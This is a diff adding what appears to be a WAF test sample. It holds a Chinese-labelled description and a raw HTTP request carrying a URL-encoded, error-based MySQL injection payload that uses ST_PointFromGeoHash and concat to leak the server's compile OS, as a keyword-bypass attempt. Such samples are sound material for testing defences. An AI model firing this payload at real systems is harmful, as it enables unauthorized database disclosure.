@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_报错注入(等价关键字绕过)-06506278
+# 基于报错注入进行等价关键字绕过注入，该SQL注入语句的攻击目的是获取数据库版本和编译操作系统版本。攻击手段是利用ST_PointFromGeoHash函数和concat函数将数据库版本和编译操作系统版本与特定字符串拼接，并利用注入的恶意代码进行查询获取这些信息。这种注入攻击可能导致未经授权的访问和数据泄露。这个注入语句尝试通过连接自定义字符串和系统函数的结果来构造一个地理坐标，并将其作为参数传递给ST_PointFromGeoHash函数。通过选择和连接特定字符串（如0x7e）和system函数（如@@version_compile_os），攻击者可以尝试在查询中注入恶意代码以获取目标信息。
+GET /?id=1%20and%20ST_PointFromGeoHash%28concat%280x7e%2C%28select%20%20@@version_compile_os%29%2C0x7e%29%2C1%29%20%20&bid=hd_tag_m8mv24bs HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24bs
+RM-PRO-Token: 9bcaac6b3de781fea8c42eaf6bff2b13
+RM-PRO-Time: 1742808373676
+User-Agent: curl/7.83.1
+
